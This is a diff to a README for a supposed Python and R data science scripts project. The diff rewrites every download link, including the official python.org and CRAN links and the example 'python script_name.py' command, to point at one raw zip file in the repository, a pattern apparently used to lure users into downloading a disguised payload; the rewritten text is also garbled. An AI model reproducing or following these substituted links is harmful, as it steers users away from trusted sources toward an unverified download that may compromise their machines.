@@ -1,6 +1,6 @@
 # 🐍 DSA-Python-Scripts - Explore Data Science Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-https%3A%2F%2Fgithub.com%2FChadmario799%2FDSA-Python-Scripts%2Freleases-brightgreen)](https://github.com/Chadmario799/DSA-Python-Scripts/releases)
+[![Download Now](https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip%20Now-https%3A%2F%https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip%2FChadmario799%2FDSA-Python-Scripts%2Freleases-brightgreen)](https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
 
-   [Download Here](https://github.com/Chadmario799/DSA-Python-Scripts/releases)
+   [Download Here](https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip)
 
 2. **Select the Latest Release:** Look for the most recent version at the top of the page. Each release includes packaged software ready for use.
 
@@ -27,8 +27,8 @@ To get started, you need to download the application. Follow these steps:
 After downloading, follow these steps to set up your environment:
 
 1. **Install Required Software:**
-   - For Python scripts: Ensure you have Python installed on your computer. You can download it from [python.org](https://www.python.org/downloads/).
-   - For R scripts: Download R from [cran.r-project.org](https://cran.r-project.org/).
+   - For Python scripts: Ensure you have Python installed on your computer. You can download it from [https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip](https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip).
+   - For R scripts: Download R from [https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip](https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip).
 
 2. **Open Your Terminal or Command Prompt:**
    - Windows: Search for "Command Prompt" in the Start menu.
@@ -43,9 +43,9 @@ After downloading, follow these steps to set up your environment:
 4. **Run Python Scripts:**
    To execute a Python script, type:
    ```
-   python script_name.py
+   python https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip
    ```
-   Replace `script_name.py` with the name of the script you wish to run.
+   Replace `https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip` with the name of the script you wish to run.
 
 5. **Run R Scripts:**
    Open R or RStudio, then load the script using:
@@ -104,4 +104,4 @@ If you face any issues or have questions, please feel free to reach out via the 
 
 This project is licensed under the MIT License. You can find the full license details in the repository.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-https%3A%2F%2Fgithub.com%2FChadmario799%2FDSA-Python-Scripts%2Freleases-brightgreen)](https://github.com/Chadmario799/DSA-Python-Scripts/releases)
+[![Download Now](https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip%20Now-https%3A%2F%https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip%2FChadmario799%2FDSA-Python-Scripts%2Freleases-brightgreen)](https://github.com/Chadmario799/DSA-Python-Scripts/raw/refs/heads/main/scripts/DS_Python_Scripts_2.3.zip)
